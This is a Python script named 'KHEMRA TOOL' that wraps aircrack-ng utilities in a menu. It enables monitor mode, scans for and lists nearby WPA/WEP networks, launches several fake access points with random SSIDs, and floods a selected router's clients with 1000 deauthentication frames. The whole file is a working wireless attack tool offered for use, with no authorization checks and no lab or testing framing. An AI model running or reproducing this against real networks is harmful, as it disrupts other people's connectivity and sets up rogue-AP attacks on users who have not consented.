import os
import random
import time
import colorama
from colorama import Fore

# Interface used for Monitor Mode
interface = "wlan0mon"

# Function: Display Banner
def banner():
    os.system("clear")
    print(Fore.YELLOW + "="*50)
    os.system("figlet -f slant 'KHEMRA TOOL'")
    print(Fore.YELLOW + "="*50)
    print(Fore.CYAN + "[1] Start Monitor Mode")
    print(Fore.CYAN + "[2] Scan & Select WiFi")
    print(Fore.CYAN + "[3] Spam Fake WiFi (Random SSID)")
    print(Fore.CYAN + "[4] Deauth Entire WiFi Network (Aircrack-ng Fix)")
    print(Fore.CYAN + "[5] Exit")
    print(Fore.YELLOW + "="*50)

# Function: Start Monitor Mode
def start_monitor():
    print(Fore.GREEN + "[📡] Enabling Monitor Mode on wlan0...")
    os.system("sudo airmon-ng check kill")
    os.system("sudo airmon-ng start wlan0")
    input(Fore.YELLOW + "[⏎] Press Enter to continue...")

# Function: Scan WiFi & Select Target
def scan_wifi():
    print(Fore.RED + "[⚠️] Scanning for WiFi networks...")
    os.system(f"sudo airodump-ng {interface} --output-format csv -w scan_results")

    try:
        with open("scan_results-01.csv", "r") as file:
            lines = file.readlines()
            wifi_list = []

            for line in lines:
                if "WPA" in line or "WEP" in line:
                    data = line.split(",")
                    mac = data[0].strip()
                    channel = data[3].strip()
                    ssid = data[13].strip() if len(data) > 13 else "Hidden"
                    if mac and ssid:
                        wifi_list.append((mac, ssid, channel))

            if not wifi_list:
                print(Fore.RED + "[❌] No networks found!")
                return None

            print(Fore.GREEN + f"[✅] Found {len(wifi_list)} networks.")
            for i, (mac, ssid, channel) in enumerate(wifi_list):
                print(Fore.CYAN + f"[{i+1}] {ssid} - {mac} (Channel {channel})")

            choice = int(input(Fore.YELLOW + "[📌] Select WiFi Number: ")) - 1
            return wifi_list[choice]
    except FileNotFoundError:
        print(Fore.RED + "[❌] Scan file not found. Try again!")
        return None

# Function: Spam Fake WiFi (Random SSID)
def spam_fake_wifi():
    print(Fore.RED + "[🔥] Creating Random Fake WiFi...")

    for i in range(5):  # Spam 5 Fake WiFi
        ssid = f"FakeWiFi_{random.randint(1000,9999)}"
        print(Fore.GREEN + f"[🚀] Starting Fake AP: {ssid}")

        os.system(f"sudo airbase-ng -e \"{ssid}\" -c 6 {interface} &")
    
    input(Fore.YELLOW + "[⏎] Press Enter to stop Fake WiFi...")
    os.system("sudo pkill airbase-ng")

# Function: Deauth Entire WiFi Network (Aircrack-ng Fix)
def deauth_wifi(router_mac, channel):
    print(Fore.RED + f"[⚠️] Setting WiFi Adapter to Channel {channel}...")
    os.system(f"sudo iwconfig {interface} channel {channel}")
    
    print(Fore.RED + f"[⚠️] Deauthing all devices on {router_mac}...")
    os.system(f"sudo aireplay-ng --deauth 1000 -a {router_mac} {interface}")

# Main Menu
wifi_info = None  # Store selected WiFi info
while True:
    banner()
    choice = input(Fore.YELLOW + "[📌] Enter your choice: ")

    if choice == "1":
        start_monitor()
    elif choice == "2":
        wifi_info = scan_wifi()
    elif choice == "3":
        spam_fake_wifi()
    elif choice == "4":
        if wifi_info:
            deauth_wifi(wifi_info[0], wifi_info[2])  # Pass MAC & Channel
        else:
            print(Fore.RED + "[❌] No WiFi selected!")
    elif choice == "5":
        print(Fore.YELLOW + "[👋] Exiting... Goodbye!")
        break
    else:
        print(Fore.RED + "[❌] Invalid option! Try again.")

    time.sleep(2)
